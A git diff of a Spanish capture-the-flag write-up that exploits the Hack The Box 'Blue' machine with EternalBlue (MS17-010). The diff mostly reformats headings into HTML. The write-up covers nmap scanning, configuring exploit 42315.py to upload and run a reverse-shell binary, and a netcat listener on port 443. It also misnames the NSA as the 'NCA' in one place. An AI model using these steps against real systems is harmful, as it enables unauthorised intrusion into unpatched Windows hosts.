@@ -23,8 +23,46 @@ tags:
 ![](/assets/images/htb-writeup-blue/blue_logo.png)
 Una máquina relativamente fácil, ya que usamos un Exploit muy conocido que hace juego con el nombre de la máquina y que hay una historia algo curiosa, siendo que este Exploit "supuestamente" fue robado a la NCA.
 
-# Recopilación de Información
-## Traza ICMP
+
+<br>
+<hr>
+<div id="Indice">
+	<h1>Índice</h1>
+	<ul>
+		<li><a href="#Recopilacion">Recopilación de Información</a></li>
+			<ul>
+				<li><a href="#Ping">Traza ICMP</a></li>
+				<li><a href="#Puertos">Escaneo de Puertos</a></li>
+				<li><a href="#Servicios">Escaneo de Servicios</a></li>
+			</ul>
+		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#Exploit">Buscando y Configurando un Exploit</a></li>
+			</ul>
+		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#Blue">Investigación del Eternal Blue</a></li>
+				<li><a href="#Notas">Notas Adicionales sobre NMAP</a></li>
+                        </ul>
+		<li><a href="#Links">Links de Investigación</a></li>
+	</ul>
+</div>
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="Ping">Traza ICMP</h2>
+
 Como siempre, vamos a ver si la máquina está conectada, lanzando un ping y a su vez, veremos que SO opera gracias al TTL.
 ```
 ping -c 4 10.10.10.40 
@@ -40,7 +78,8 @@ rtt min/avg/max/mdev = 128.426/129.686/130.894/0.884 ms
 ```
 Vemos que la máquina tiene el sistema Windows, empecemos ahora con los escaneos.
 
-## Escaneo de Puertos
+<h2 id="Puertos">Escaneo de Puertos</h2>
+
 Vamos a buscar que puertos están abiertos en esta máquina:
 ```
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.40 -oG allPorts             
@@ -84,7 +123,8 @@ Nmap done: 1 IP address (1 host up) scanned in 48.61 seconds
 
 Vemos varios puertos abiertos, pero ya podemos deducir que la máquina usa el servicio SMB. Ahora vamos al escaneo de servicios.
 
-## Escaneo de Servicios
+<h2 id="Servicios">Escaneo de Servicios</h2>
+
 Aplicando escaneo de servicios a los puertos abiertos:
 ```
 nmap -sC -sV -p135,139,445,49152,49154,49156 10.10.10.40 -oN targeted              
@@ -157,8 +197,21 @@ Unable to connect with SMB1 -- no workgroup available
 ```
 Vemos la carpeta del Admin y usuarios, si bien podemos intentar entrar en usuarios, porque obviamente en Admin no podremos, vamos a buscar un Exploit primero.
 
-# Análisis de Vulnerabilidades
-## Buscando un Exploit
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="Exploit">Buscando y Configurando un Exploit</h2>
+
 Hagamos como siempre, usando la herramienta **Searchsploit** para buscar un Exploit adecuado de la máquina, como servicio usaremos: Windows 7 Professional 7601 Service Pack 1.
 ```
 searchsploit Windows 7 Profesional 7601 service pack 1
@@ -173,7 +226,8 @@ Y justo nos sale un GitHub con un Exploit:
 
 Leyéndolo un poco, este Exploit necesita usar un entorno virtual en python 2, necesitamos tener instalada la **librería Impacket** de python y crear una **Reverse Shell**, obviamente antes de continuar hay que clonar el GitHub en nuestro equipo.
 
-## Configurando Exploit
+Vamos a configurar el Exploit por pasos.
+
 * Cambiando nombre de Exploit (opcional):
 ```
 mv 42315.py Eternal_Blue.py
@@ -199,7 +253,19 @@ smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py') -> smb_send_file(smbConn
 service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt') -> service_exec(conn, r'cmd /c c:\eternal-blue.exe')
 ```
 
-# Explotación de Vulnerabilidades
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
 Una vez ya listo el Exploit y siguiendo en el entorno virtual, vamos a activar una **netcat** que es ahí donde se conectara el Exploit y luego activamos el Exploit:
 ```
 nc -nvlp 443
@@ -255,7 +321,8 @@ Y listo, ya estamos dentro la máquina, ya solo buscamos las flags y yasta...per
 
 Bueno vamos a investigar que es eso de Eternal Blue.
 
-## Investigación
+<h2 id="Blue">Investigación del Eternal Blue</h2>
+
 Bueno el Eternal Blue es una serie de vulnerabilidades del software de Microsoft como el Exploit creado por la **NSA** como herramienta de ciberataque. Es denominado **MS17-010**, por lo que lo podemos buscar así en internet o en **Searchsploit**:
 
 ```
@@ -302,7 +369,8 @@ Hay un GitHub que incluye muchas cosas más y claro con la explicación de cada 
 Este básicamente es lo mismo que descargamos, pero incluye más scripts útiles, por así decirlo es más completo y algo útil que tiene es un script en python llamado **checker**, que nos puede ayudar a detectar los **named pipes**, estos nos sirven para ver en cuales son potenciales para inyectar comandos. Esto es mejor explicado por el **streamer S4vitar** en el siguiente link: 
 * https://www.youtube.com/watch?v=92XycxcAXkI
 
-## Notas
+<h2 id="Notas">Notas Adicionales sobre NMAP</h2>
+
 Si queremos usar las herramientas que están en el GitHub que usar S4vitar, es necesario instalar pip2 para usar python2, para esto hacemos lo siguiente:
 * Actualizamos todo: apt update
 * Necesitamos un archivo para poder usar el pip2, para obtenerlo usamos: curl https://bootstrap.pypa.io/pip/2.7/get-pip.py > get-pip.py
@@ -356,11 +424,22 @@ Host script results:
 Nmap done at Jan 19 12:42:44 2023 -- 1 IP address (1 host up) scanned in 4.35 seconds
 ```
 
-## Links de Investigación
+
+<br>
+<br>
+<div style="position: relative;">
+ <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+
+
 * https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit
 * https://www.avast.com/es-es/c-eternalblue
 * https://www.exploit-db.com/exploits/42315
 * https://github.com/worawit/MS17-010
 * https://www.youtube.com/watch?v=92XycxcAXkI
 
+<br>
 # FIN
